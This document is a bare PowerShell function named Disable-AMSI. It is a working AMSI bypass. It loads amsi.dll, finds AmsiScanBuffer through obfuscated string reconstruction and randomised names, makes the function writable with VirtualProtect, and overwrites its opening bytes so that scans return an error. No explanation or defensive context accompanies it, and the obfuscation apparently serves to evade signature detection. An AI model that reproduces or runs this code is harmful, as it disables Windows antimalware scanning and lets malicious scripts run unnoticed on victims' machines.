function Disable-AMSI
{
$xudbk = @"
using System;
using System.Runtime.InteropServices;
public class xudbk {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr pbsxld, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $xudbk
$wvyfoqc = [xudbk]::LoadLibrary("$(('âmsì.'+'dll').nOrMALIZe([cHAR](70)+[ChAR]([BYTE]0x6f)+[CHAr](114)+[ChAR]([byTe]0x6d)+[CHAR](68*12/12)) -replace [Char](92+19-19)+[cHar]([ByTe]0x70)+[cHaR](123+15-15)+[chAR](77)+[Char](110*102/102)+[cHar]([BytE]0x7d))")
$dhdzwx = [xudbk]::GetProcAddress($wvyfoqc, "$(('ÁmsìScänBu'+'ffer').NorMAlIZE([chaR]([byTE]0x46)+[chAR](111)+[char]([Byte]0x72)+[chAR]([BYtE]0x6d)+[CHar]([byTE]0x44)) -replace [cHar]([BYTe]0x5c)+[CHAr](112)+[cHAR]([bytE]0x7b)+[char]([bytE]0x4d)+[ChAR](110)+[CHAR](125+4-4))")
$p = 0
[xudbk]::VirtualProtect($dhdzwx, [uint32]5, 0x40, [ref]$p)
$qbzv = "0xB8"
$dnyd = "0x57"
$ttvz = "0x00"
$xcoe = "0x07"
$dlsl = "0x80"
$vslp = "0xC3"
$dcios = [Byte[]] ($qbzv,$dnyd,$ttvz,$xcoe,+$dlsl,+$vslp)
[System.Runtime.InteropServices.Marshal]::Copy($dcios, 0, $dhdzwx, 6)
}
